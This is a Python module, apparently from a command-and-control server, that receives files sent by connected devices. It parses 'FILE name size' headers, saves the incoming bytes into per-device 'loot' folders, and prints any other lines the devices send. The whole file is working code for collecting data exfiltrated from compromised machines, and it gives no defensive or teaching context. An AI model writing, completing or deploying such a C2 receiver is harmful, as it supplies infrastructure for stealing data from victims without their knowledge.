import os
from .config import LOOT_DIR, MAGENTA, AMARELO, VERDE, CINZA, RESET
from .logger import log


def processar(cli, c2):
    while True:
        if cli.arquivo is not None:
            falta = cli.arquivo_tamanho - cli.arquivo_recebido
            if not cli.buffer:
                return
            pedaco = cli.buffer[:falta]
            cli.arquivo.write(pedaco)
            cli.arquivo_recebido += len(pedaco)
            cli.buffer = cli.buffer[len(pedaco):]
            if cli.arquivo_recebido >= cli.arquivo_tamanho:
                cli.arquivo.close()
                log(
                    f"recebido {AMARELO}{cli.arquivo_nome}{RESET}{CINZA} "
                    f"({cli.arquivo_tamanho} bytes) do dev{cli.id}",
                    VERDE,
                )
                cli.arquivo = None
                cli.arquivo_nome = None
                c2.prompt()
            continue

        if cli.buffer.startswith(b"FILE "):
            nl = cli.buffer.find(b"\n")
            if nl == -1:
                return
            header = cli.buffer[:nl].decode(errors="replace")
            try:
                _, nome, tam = header.split()
                tam = int(tam)
            except ValueError:
                cli.buffer = cli.buffer[nl + 1:]
                continue
            cli.buffer = cli.buffer[nl + 1:]
            pasta = os.path.join(LOOT_DIR, f"dev{cli.id}")
            os.makedirs(pasta, exist_ok=True)
            cli.arquivo = open(os.path.join(pasta, nome), "wb")
            cli.arquivo_nome = nome
            cli.arquivo_tamanho = tam
            cli.arquivo_recebido = 0
            continue

        nl = cli.buffer.find(b"\n")
        if nl == -1:
            return
        linha, cli.buffer = cli.buffer[:nl], cli.buffer[nl + 1:]
        texto = linha.decode(errors="replace")
        if texto.strip():
            print(f"\n{MAGENTA}[dev{cli.id}]{RESET} {texto}")
